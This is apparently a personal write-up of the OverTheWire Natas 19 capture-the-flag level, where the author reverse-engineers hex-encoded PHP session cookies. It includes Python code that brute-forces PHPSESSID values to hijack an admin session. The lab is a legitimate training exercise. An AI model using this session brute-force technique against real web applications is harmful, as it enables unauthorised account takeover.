# Challenge Overview

We are greeted with a page that tells us that similar code is used but that the session IDs are no longer sequential. We are then called to log in with admin credentials again. If there's anything expected from the previous challenge, it's that the log in boxes are once again useless.

## Challenge Approach

I tried logging in with random credentials and observed (via Firefox) that the PHP cookies seemed to be hexadecimal values. I deleted a few cookies (not before saving their values first) in order to get a few values to understand their patterning. This is what they looked like:

```
126-a
338-a
260-a
```

At this point, I realized that burpsuite wasn't going to hold its own because I needed something that would quickly convert values to hex. It was time to take out Python! Now, I know nothing about python web hacking, so I simply looked up [a tutorial of the previous challenge](https://www.youtube.com/watch?v=C9yxUTQLbRI&list=PL1H1sBF1VAKWM3wMCn6H5Ql6OrgIivt2V&index=16) to watch and learn.


```python
import requests

# Define username and password
username = 'natas19'
password = 'REDACTED'

url = 'http://%s.natas.labs.overthewire.org' % username

session = requests.Session()

# Get request with parameters of the URL, the username
# and password to log in, and the cookie
response = session.get(url, auth=(username, password))

# Prints the HTML response and the cookies of the session
print(response.text)
print(session.cookies)
```



I then used [this source](https://python-forum.io/thread-1715.html) to find out how to convert to hexadecimal in Python. This ran a successful test:

```python
for session_id in range(1, 100, 10):
    session_str = str(session_id) + "-a"
    print(session_str, end=' ')
    session_str = session_str.encode('utf-8').hex()
    print(session_str)
```

Then, all I had to do was incorporate a brute-force of the session ID in get requests to the for loop...

```python
for session_id in range(1, 641):
    session_str = str(session_id) + "-a"
    session_str = session_str.encode('utf-8').hex()
    response = session.get(url, cookies={"PHPSESSID": str(session_str)}, auth=(username, password))
    if 'You are an admin' in response.text:
        print('Success!')
        print(response.text)
        break
    else:
        print("Tried " + session_str)
```

I then brute-forced all the possible cookies and yielded no results. After hours of troubleshooting, I viewed a video walkthrough and found I was supposed to append `-admin` instead of `-a` to the session ID. It seems I had all the parts right except for the most obvious one.
